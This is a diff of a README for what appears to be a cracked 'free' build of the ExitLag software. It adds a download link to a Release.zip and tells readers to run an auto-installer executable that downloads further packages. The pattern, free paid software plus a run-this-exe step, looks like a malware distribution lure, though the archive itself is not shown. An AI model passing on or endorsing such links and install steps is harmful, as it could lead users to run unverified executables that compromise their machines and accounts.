@@ -8,11 +8,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/c9f9ce1c-a764-422e-a40c-bc1b07870f5e)
-]()
+](https://github.com/GoDToD/Exitlag-Free-2024/releases/download/V3.54/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/GoDToD/Exitlag-Free-2024/releases/download/V3.54/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-24_14-32-16](https://github.com/user-attachments/assets/0eceaddc-cf8c-415c-bfff-bbe472e3babf)
